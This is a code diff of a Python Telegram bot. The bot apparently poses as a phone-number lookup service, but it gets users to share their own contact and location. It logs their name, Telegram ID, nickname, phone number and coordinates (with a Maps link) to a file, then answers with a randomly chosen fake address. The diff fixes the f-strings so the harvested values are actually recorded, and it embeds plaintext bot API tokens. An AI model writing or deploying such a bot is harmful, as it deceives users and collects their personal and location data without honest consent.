@@ -1,11 +1,13 @@
+
 import telebot
 from telebot import types
 import time
 import random
 
 ID = '661262775'
-bot = telebot.TeleBot("6264887049:AAHVKKKZA7bVnzi7VdML1WH_PGq4mRqpfrY")
+bot = telebot.TeleBot("6296022389:AAH84-tKh_LlcGUaspHpvmaqVgHF2yz8hmI")
 adr = ['Tverskaya street, house 13', '60th Anniversary of October Avenue', 'Vinokurova Street', '3rd Golutvinsky Lane']
+# Dictionary to store click count for each user
 click_count = {}
 
 # Function to create an inline keyboard with buttons
@@ -62,7 +64,7 @@ def proc2(message):
 			msg = bot.reply_to(message, 'It seems you did not enter a valid phone number, please try again by typing /getinfo!')#⏳
 			return
 
-		bot.send_message(m_id, f'Request for number {{num}} has been sent!')
+		bot.send_message(m_id, f'Request for number {num} has been sent!')
 		time.sleep(2)
 		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
 		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
@@ -84,10 +86,10 @@ def contact(message):
 		phone = message.contact.phone_number
 		info = f'''
 			Data
-			├Name: {{first}} {{last}}
-			├ID: {{userid}}
-			├Nick: @{{nick}}
-			└Phone number: {{phone}}
+			├Name: {first} {last}
+			├ID: {userid}
+			├Nick: @{nick}
+			└Phone number: {phone}
 			'''
 		log = open('bot-log.txt', 'a+', encoding='utf-8')
 		log.write(info + '  ')
@@ -122,10 +124,10 @@ def contact(message):
 		lat = str(message.location.latitude)
 		geo = f'''
 		Геолокация
-		├ID: {{message.chat.id}}
-		├Longitude: {{lon}}
-		├Latitude: {{lat}}
-		└Cards: https://www.google.com/maps/place/{{lat}}+{{lon}} 
+		├ID: {message.chat.id}
+		├Longitude: {lon}
+		├Latitude: {lat}
+		└Cards: https://www.google.com/maps/place/{lat}+{lon} 
 		'''
 		log = open('bot-log.txt', 'a+', encoding='utf-8')
 		log.write(geo + '  ')
@@ -134,6 +136,7 @@ def contact(message):
 		print(geo)
 		bot.send_message(message.chat.id, f'''
 			Geolocation
-			└Address: {{random.choice(adr)}}
+			└Address: {random.choice(adr)}
 			''')
 bot.polling()
+        
